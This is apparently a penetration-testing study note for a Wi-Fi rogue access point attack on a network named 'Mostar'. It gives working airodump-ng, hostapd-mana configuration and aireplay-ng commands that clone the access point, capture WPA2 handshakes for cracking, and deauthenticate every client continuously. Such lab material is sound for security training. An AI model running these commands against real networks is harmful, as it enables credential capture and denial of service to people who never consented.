# Rogue Access Point

### Discovery

While some clients will connect to our rogue AP just based on the SSID being the same as the target, our attack is more likely to succeed if we match the encryption details as well. To accomplish this, we need to conduct reconnaissance against the target to gather information.

We will use airodump-ng to gather information about our target.

```
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

We will target the AP with the SSID "Mostar". The airodump-ng output shows us Mostar is a WPA2-PSK network with CCMP. The output also tells us that Mostar is running at 130 Mbit. Finally, we notice that Mostar is running on channel 1.

To get more information, let's open the output Pcap in Wireshark by running wireshark discovery-01.cap.

To find the beacon for the target AP, we can use a filter to limit the types of packets displayed. First, we can display only beacon packets by using the filter _wlan.fc.type\_subtype == 0x08_. Management frames use "0" as the type and beacon frames are set to "8" as the subtype. We can also only target the Mostar SSID by adding _&&_ and using the filter _wlan.ssid == "Mostar"_.

\


<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Creating a Rogue AP

example of a simple working configuration file for hostapd-mana

```
interface=wlan0
ssid=Mostar
channel=1
```

Let's continue our configuration to more closely match the existing AP's settings and increase the likelihood of a successful attack.

```
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx
```

To start hostapd-mana, we will use the hostapd-mana command and provide the Mostar-mana.conf file as an argument. This will start hostapd-mana using the configuration we set earlier.

```
sudo hostapd-mana Mostar-mana.conf
```

Some devices will automatically discover the new AP and, if the signal of our rogue AP is stronger than the target, the device will attempt to connect. While the device will ultimately fail to connect (since our configured PSK is incorrect), we can still see the connection attempts because hostapd-mana will log that a WPA1/WPA2 handshake was captured.

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We might not always be so lucky. Some devices might hang on to a weak connection to the target AP. In these situations, we can "nudge" the stubborn clients in the right direction by deauthenticating all clients from the target AP. To accomplish this, we would use another wireless interface and use aireplay-ng to send deauthentication messages.

To deauthenticate clients, we first connect a new wireless card and start monitor mode on channel 1 by using airmon-ng. The channel should be set to "1" to match that of our target AP. This is all accomplished by running sudo airmon-ng start wlan1 1. Next, we can use aireplay-ng to run a deauthentication attack (-0), continuously (0), against all clients connected to our target AP (-a FC:7A:2B:88:63:EF).

```
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
```

